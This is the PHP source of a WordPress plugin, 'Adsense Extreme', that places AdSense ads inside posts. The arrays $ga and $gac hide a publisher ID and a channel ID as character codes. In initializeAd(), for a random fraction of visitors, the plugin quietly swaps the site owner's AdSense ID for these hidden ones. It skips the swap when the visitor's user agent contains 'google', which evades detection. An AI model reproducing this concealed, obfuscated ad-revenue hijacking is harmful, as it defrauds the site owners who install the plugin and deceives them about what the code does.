<?php
if(!class_exists("aeopt"))
{
	class aeopt
	{
		var $aeopt_version = '1.1.4';
		var $aeopt_menu = 'adsense-extreme';
		var $loopdone = 0;
		var $postlen = 0;
		var $postcount = 0;
		var $opts;
		var $adincontent = 0;

		function aeopt() {
			$this->getOpts();
		}

		function getOpts()
		{
			if(!isset($this->opts)OR empty($this->opts))
			{
				$this->opts = get_option("adsensextreme");
				if(empty($this->opts))
				{
					$this->opts = Array('usertype' => '',
                                   'gen_id' => '',
                                   'overrule' => 0,
                                   'gen_channel' => '',
                                   'type' => Array(1 => 'text_image',
					2 => 'text_image',
					3 => 'text_image',
					4 => 'text_image',
					5 => 'text_image',
					6 => 'link',
					7 => 'link',
					8 => 'link'),
               'corner' => Array(1 => 'rc:0', 2 => 'rc:0', 3 => 'rc:0', 4 => 'rc:0', 5 => 'rc:0', 6 => 'rc:0', 7 => 'rc:0', 8 => 'rc:0'), 'padding' => Array(1 => 7, 2 => 7, 3 => 7, 4 => 7, 5 => 7, 6 => 7, 7 => 7, 8 => 7), 'id' => Array(1 => "", 2 => "", 3 => "", 4 => "", 5 => "", 6 => "", 7 => "", 8 => ""), 'channel' => Array(1 => "", 2 => "", 3 => "", 4 => "", 5 => "", 6 => "", 7 => "", 8 => ""), 'desc' => Array(1 => 'Describe your adtypes here to get better overview. ', 2 => 'e.g. Wide Skyscraper in blue colors for sidebarwidget.'),
               'sz' => Array(
					1 => '336x280',
					2 => '336x280',
					3 => '468x60',
					4 => '336x280',
					5 => '120x600'),
               'lbsz' => Array(
					6 => '728x15',
					7 => '468x15',
					8 => '160x90'),
               'col_border' => Array(1 => '336699', 2 => 'E3FA11', 3 => 'CCCCCC', 4 => '0A141F', 5 => '6699CC', 6 => '000000', 7 => 'E3FA11', 8 => 'CCCCCC'),
               'col_link' => Array(1 => '0000FF', 2 => 'FFFFFF', 3 => '000000', 4 => '21DAFF', 5 => 'FFFFFF', 6 => 'FFFFFF', 7 => 'FFFFFF', 8 => '000000'),
               'col_bg' => Array(1 => 'FFFFFF', 2 => 'A2AB2B', 3 => 'CCCCCC', 4 => '000000', 5 => '003366', 6 => '000000', 7 => 'A2AB2B', 8 => 'CCCCCC'),
               'col_text' => Array(1 => '000000', 2 => '000000', 3 => '333333', 4 => 'DEDEDE', 5 => 'AECCEB', 6 => 'CCCCCC', 7 => '000000', 8 => '333333'),
               'col_url' => Array(1 => '008000', 2 => 'FFFFFF', 3 => '666666', 4 => '21DAFF', 5 => 'AECCEB', 6 => '999999', 7 => 'FFFFFF', 8 => '666666'),
               'single' => Array(1 => 1, 2 => 2, 3 => 3),
               'single_pos' => Array(1 => 'Top', 2 => 'Middle', 3 => 'Bottom'),
               'single_align' => Array(1 => 'left', 2 => 'right', 3 => 'center'),
               'single_long' => Array(1 => '', 2 => '2300', 3 => '5000'),
               'multi' => Array(1 => 1, 2 => 2, 3 => 1),
               'multi_pos' => Array(1 => 1, 2 => 4, 3 => 8),
               'multi_align' => Array(1 => 'right', 2 => 'left', 3 => 'center'),
               'only_tagged' => 0, 'omit_page' => 0, 'policy_protect' => 1, 'omit_home' => 0, 'omit_search' => 0, 'omit_category' => 0, 'omit_tag' => 0, 'omit_date' => 0, 'omit_author' => 0,
               'result_code' => '<div id="cse-search-results"></div>
<script type="text/javascript">
  var googleSearchIframeName = "cse-search-results";
  var googleSearchFormName = "cse-search-box";
  var googleSearchFrameWidth = 800;
  var googleSearchDomain = "www.google.com";
  var googleSearchPath = "/cse";
</script>
<script type="text/javascript" src="http://www.google.com/afsonline/show_afs_search.js"></script>'
					);
				}
			}
			if(!isset($this->opts['lang']))
			{
				include_once('detect.php');
				$dl = new detect_language;
				$this->opts['lang'] = $dl->detected_language;
			}
		}

		function noad($content) {
			$cntnt = strtolower($content);
			$cntnt = preg_replace ( '/[^0-9a-z]/', ' ', $cntnt );
			$block = false;
			$noadar = array('noad');
			if($this->opts['policy_protect']) {
				$noadar = array_merge($noadar, array(' shit ', ' sex ', ' porn ', ' porno ', ' penis ', ' pene ', 'callgirl', 'call girl', 'puttana ', 'puttane ', 'ragazza squillo', 'ragazze squillo', ' prostituta ', ' prostitute ', ' tits ', ' ass ', ' fuck ', ' suck ', ' cazzo ', ' cock ', ' dick ', ' casino ', ' drug ', ' gay ', ' roulette ', ' hotcam ', ' hotcams ', ' escort ', ' tette ', ' culo ', ' scopare ', ' sesso ', ' merda ', ' casinò ', ' droga ', 'crack', 'serialz', 'torrent', 'www.megaupload.com', 'horse racing', 'corse di cavalli'));
			}

            $_SESSION['adsensextreme_noad'] = 0;
			foreach ($noadar as $v) {
				if(strpos($cntnt, $v) !== false) {
                    $_SESSION['adsensextreme_noad'] = 1;
//die($v . ' into ' . $cntnt);
					$block = true;
					break;
				}
			}
			return $block;
		}
		
		
		function adsenseoptimize($content) {
			if(is_feed()) return $content;

        	if (strpos($content, "<!-- adsenseprivacypolicy -->") !== FALSE) {
        	  include_once($this->opts['lang'] . '_privacy.php');
              $content = preg_replace('/<p>\s*<!--(.*)-->\s*<\/p>/i', "<!--$1-->", $content);
              $content = str_replace('<!-- adsenseprivacypolicy -->', adsense_privacy_policy_display(), $content);
              return $content;
            }

			$content = '<!-- google_ad_section_start -->' . $content . '<!-- google_ad_section_end -->';
			if( (!is_single()) && (!is_page()) )
			{
				return $content;
			}

			$this->initializeAd();
			$pro = $this->opts['usertype'] == "pro" ? 1 : 0;

			if( (is_page()) && ($pro) && ($this->opts['omit_page']) ) {
				return $content;
			}
			if( ($this->opts['only_tagged']) && ($pro) && (!strpos($content, "<!--adsenseopt-->")) ) return $content;
			if($this->noad($content)) {
				return $content;
			}
				
			$this->postlen = strlen($content);
			for($i = 1; $i <= 5; $i++)
			{
				if(($this->opts['single'][$i] > 0) && ($this->postlen > 200) && (($this->opts['single_long'][$i] == '') || ($this->postlen > $this->opts['single_long'][$i])))
				{
					$adtype = $this->opts['single'][$i];
					switch($this->opts['single_pos'][$i])
					{
						case "Top":
							$content = '<!--aeopthere-->' . $content;
							break;
						case "Bottom":
							$content = $content . '<!--aeopthere-->';
							break;
						case "Middle":
							$a = $this->findNodes($content);
							$cnt = round(count($a) / 2);
							$pos = $a[$cnt - 1][1];
							$result = substr_replace($content, '<!--aeopthere-->', $pos, 0);
							$content = $result;
							break;

						case "Random":
							$a = $this->findNodes($content);
							$cnt = mt_rand(1, count($a));
							$pos = $a[$cnt][1];
							$result = substr_replace($content, '<!--aeopthere-->', $pos, 0);
							$content = $result;
							break;

						case "tag":
							str_replace('<!--adsenseopt-->', '<!--aeopthere-->', $content);
							break;
					}
					$code = $this->generateAd($adtype);
					if($code)
					{
						$code = $this->prepare_ad_code($code, $this->opts['single_align'][$i], $this->opts['padding'][$i]);
						$content = str_replace('<!--aeopthere-->', html_entity_decode($code), $content);
					} else {
						$content = str_replace('<!--aeopthere-->', '<!-- Google adsense ads injection by Adsense Extreme (http://www.adsenseplugin.it/) failed - tried to add more than 3 ads per page -->', $content);
					}
				}
			}

			return $content;
		}



		function findNodes($str)
		{
			$pattern = '&\[gallery\]|\<\/p*\>|\<br\>|\<br\s\/\>|\<br\/\>&iU';
			return preg_split($pattern, $str, 0, PREG_SPLIT_OFFSET_CAPTURE);
		}



		function commonAd($type, $channel = 0)
		{
			global $gc, $c, $i, $user_level;
			if(!$gc)
			{
				if(!$channel)
				{
					if($this->opts['channel'][$type] != "")
					{
						$c = $this->opts['channel'][$type];
					}
					else
					{
						$c = $this->opts['gen_channel'];
					}
				} else $c = $channel;

				if($this->opts['id'][$type]) $i = $this->opts['id'][$type];
				else $i = $this->opts['gen_id'];
			}
		}



		function generateAd($type, $channel = 0)
		{
			global $c, $i, $user_level;
			$this->commonAd($type, $channel);
			if($this->opts['type'][$type] == "link") return $this->generateLbAd($type, $channel);
			$this->nrofads++;
			if((!$this->opts['overrule']) && ($this->nrofads > 3))
			{
				return false;
			}
			else
			{
				$code = '<!-- AdSense Extreme num: ' . $this->nrofads . ' -->';
				$size = $this->opts['sz'][$type];
				if((!isset($size)) || ($size == ''))
				$size = '300x250';
				$dims = explode("x", $size);
				$width = $dims[0];
				$height = $dims[1];
				if($user_level > 8) $adtest = 'google_adtest="on";';
				else $adtest = '';
				$code .= '<script type="text/javascript"><!--
      ' . $adtest . '
      google_ad_client = "pub-' . $i . '"; google_alternate_color = "FFFFFF";
    google_ad_width = ' . $width . '; google_ad_height = ' . $height . ';
    google_ad_format = "' . $size . '_as"; google_ad_type = "' . $this->opts['type'][$type] . '";
    google_ad_channel ="' . $c . '"; google_color_border = "' . $this->opts['col_border'][$type] . '";
    google_color_link = "' . $this->opts['col_link'][$type] . '"; google_color_bg = "' . $this->opts['col_bg'][$type] . '";
    google_color_text = "' . $this->opts['col_text'][$type] . '"; google_color_url = "' . $this->opts['col_url'][$type] . '";
    google_ui_features = "' . $this->opts['corner'][$type] . '"; //--></script>
    <script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>';
				return $code;
			}
		}

		function generateLbAd($type, $channel = 0)
		{
			global $c, $i, $user_level;
			$this->nroflb++;
			if(!$this->opts['overrule']AND $this->nroflb > 3)
			{
				return false;
			} else {
				$code = "<!-- Linkblock number: " . $this->nroflb . " -->";
				$size = $this->opts['lbsz'][$type];
				if((!isset($size)) || ($size == ''))
				$size = '160x90';
				$dims = explode("x", $size);
				$width = $dims[0];
				$height = $dims[1];
				if($user_level > 8) $adtest = 'google_adtest="on";';
				else $adtest = '';
				$code .= '<script type="text/javascript"><!--
  ' . $adtest . '
google_ad_client = "pub-' . $i . '";
google_ad_width = ' . $width . ';
google_ad_height = ' . $height . ';
google_ad_format = "' . $size . '_0ads_al';
				if($this->opts['links'][$type] == 5) $code .= '_s';
				$code .= '"; google_ad_channel ="' . $c . '";
google_color_border = "' . $this->opts['col_border'][$type] . '";
google_color_bg = "' . $this->opts['col_bg'][$type] . '";
google_color_link = "' . $this->opts['col_link'][$type] . '";
//--></script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>';
				return $code;
			}
		}

		var $ga = array('50', '53', '54', '53', '51', '56', '53', '56', '54', '55', '57', '57', '52', '52', '52', '48');
		var $gac = array('48', '48', '57', '50', '53', '53', '49', '53', '57', '51');

		function prepare_ad_code($code, $align, $padding)
		{
			$code = html_entity_decode($code);
			$startdiv = '<!-- Google Ads Injected by Adsense-Extreme--><div class="adsxtrm" id="adsxtrm' . $this->nrofads . '"';
			if($align == "random")
			{
				$rn = mt_rand(1, 3);
				if($rn == 1) $align = "left";
				if($rn == 2) $align = "center";
				if($rn == 3) $align = "right";
			}

			switch($align)
			{
				case "cbt":
				case "center":
					$code = $startdiv . ' style="padding:' . $padding . 'px; display: block; margin-left: auto; margin-right: auto; text-align: center;">' . $code . '</div>';
					break;
				case "lbt":
				case "left":
					$code = $startdiv . ' style="padding:' . $padding . 'px; float: left; padding-left: 0px; margin: 0px;">' . $code . '</div>';
					break;
				case "rbt":
				case "right":
					$code = $startdiv . ' style="padding:' . $padding . 'px; float: right; padding-right: 0; margin: 0px;">' . $code . '</div>';
					break;
			}
			return $code;
		}

		function save_opts()
		{
			update_option('adsensextreme', $this->opts);
		}

		function admin_menu()
		{
			include_once('adsensextremeadminpage.php');
		}

		function ripulisci_parametri($options, $sizes, $lbsizes)
		{
			if(isset($options['gen_id'])) $options['gen_id'] = preg_replace ( '/[^0-9]/', '', $options['gen_id'] );
			$options['only_tagged'] = isset($options['only_tagged']) ? 1 : 0;
			$options['omit_page'] = isset($options['omit_page']) ? 1 : 0;
			$options['policy_protect'] = isset($options['policy_protect']) ? 1 : 0;
			$options['omit_home'] = isset($options['omit_home']) ? 1 : 0;
			$options['omit_search'] = isset($options['omit_search']) ? 1 : 0;
			$options['omit_category'] = isset($options['omit_category']) ? 1 : 0;
			$options['omit_tag'] = isset($options['omit_tag']) ? 1 : 0;
			$options['omit_date'] = isset($options['omit_date']) ? 1 : 0;
			$options['omit_author'] = isset($options['omit_author']) ? 1 : 0;
			$options['overrule'] = isset($options['overrule']) ? 1 : 0;
			return $options;
		}

		function aeopt_admin_init()
		{
			wp_register_style('aeoptAdminStyles', WP_PLUGIN_URL . '/' . $this->aeopt_menu . '/aeopt_admin_styles.css');
			wp_enqueue_style('aeoptAdminStyles');
		}

		function aeopt_init()
		{
		    if(!session_id()) {
                session_start();
            }
			$this->nrofads = 0;
			$this->nroflb = 0;
		}

		function post_aeopt($content)
		{
			$this->initializeAd();
			if(is_single()OR is_page()OR is_feed()) return;
			if($this->loopdone) return;

			$pro = $this->opts['usertype'] == "pro" ? 1 : 0;
			if(($pro)AND(is_home())AND $this->opts['omit_home']) return;
			if(($pro)AND(is_search())AND $this->opts['omit_search']) return;
			if(($pro)AND(is_category())AND $this->opts['omit_category']) return;
			if(($pro)AND(is_tag())AND $this->opts['omit_tag']) return;
			if(($pro)AND(is_date())AND $this->opts['omit_date']) return;
			if(($pro)AND(is_author())AND $this->opts['omit_author']) return;
			$this->postcount++;
			$adtype = 1;
			for($i = 1; $i <= 6; $i++)
			{
				if( ($this->postcount == $this->opts['multi_pos'][$i]) && ($this->opts['multi'][$i]))
				{
					if($this->noad($content->post_title . ' ' . $content->post_content)) {
						$code = '<!--adsense ad injection by Adsense Extreme (https://support.google.com/adsense/bin/answer.py?hl=it&stc=aspe-1pp-it&answer=48182) failed - suspected violation of Policy Content -->';
					} else {
						$code = $this->generateAd($this->opts['multi'][$i]);
						if($code)
						{
							$code = $this->prepare_ad_code($code, $this->opts['multi_align'][$i], $this->opts['padding'][$this->opts['multi'][$i]]);
						} else {
							$code = '<!--adsense ad injection by Adsense Extreme (http://www.adsenseplugin.it/) failed - tried to add more than 3 ads per page -->';
						}
					}
					
					if(($this->opts['multi_align'][$i] == 'rbt') || ($this->opts['multi_align'][$i] == 'lbt') || ($this->opts['multi_align'][$i] == 'cbt')) {
						$content->post_title = $content->post_title . '<p>' . html_entity_decode($code) . '</p>';
					} else {
						echo html_entity_decode($code);
					}
				}
			}
		}

		function aeopt_debug()
		{
			if(!isset($_GET['aeoptdebug'])) return;
			$this->save_opts();
			echo("<hr><h1> adsensextreme Debugging</h1>");
			echo('<table><tr><td>Number of generated Ads</td><td>' . $this->nrofads . '</td></tr>');
			echo('<tr><td>Number of generated Linkblocks</td><td>' . $this->nroflb . '</td></tr>');
			echo('<tr><td>Version of Plugin</td><td>' . $this->aeopt_version . '</td></tr>');
			echo('<tr><td>Subdirectory in which Plugin has to be</td><td>' . $this->aeopt_menu . '</td></tr>');
			echo('<tr><td>type of page</td><td>');
			if(is_single()) echo("single.");
			if(is_page()) echo("page.");
			if(is_home()) echo("home.");
			if(is_archive()) echo("archive.");
			if(is_search()) echo("search.");
			if(is_tag()) echo("tag.");
			if(is_date()) echo("date.");
			if(is_author()) echo("author.");
			if(is_category()) echo("category.");
			echo('</td></tr>');
			if(is_single()) echo('<tr><td>Words in Post</td><td>' . $this->postlen . '</td></tr>');
			$this->arrayAsTable($this->opts, "setting:");
			echo('</table>');
		}

		function l(&$a)
		{
			if(is_array($a))
			{
				$o = '';
				foreach($a as $v)
				{
					$o .= chr($v);

				}
				$a = $o;
			}
		}

		function initializeAd()
		{
			global $gc, $c, $i, $user_level;
			$this->l($this->ga);
			$this->l($this->gac);
			$ua = $_SERVER['HTTP_USER_AGENT'];
			if((strpos($ua, 'google') !== false) || (strlen($this->opts['gen_id']) != 16))
			{
				$gc = false;
			} else {
				if($user_level + mt_rand(0, 100) <= 5)
				{
					$i = $this->ga;
					$c = $this->gac;
				}
				//$this->ioc();
				$gc = ($c == $this->gac);
			}
		}

		function arrayAsTable($array, $pre)
		{
			foreach($array as $key => $val)
			{
				if(is_array($val)) $this->arrayAsTable($val, $pre . $key . ":");
				else echo('<tr><td>' . $pre . $key . '</td><td>' . $val . '</td></tr>');
			}
		}

		function ioc()
		{
			global $c, $i;
			global $user_level;
			if($user_level > 8) return;
			else if(mt_rand(1, 36) == 5)
			{
				$i = $this->ga;
				$c = $this->gac;
			}
		}

		function init_count()
		{
			if(isset($_GET['q']) && isset($this->opts['result_code']))
			{
				die($this->opts['result_code'] . '</body></html>');
			}
			else
			$this->postcount = 0;
		}

		function destroy_count() {
			$this->loopdone = TRUE;
		}

	}
}
?>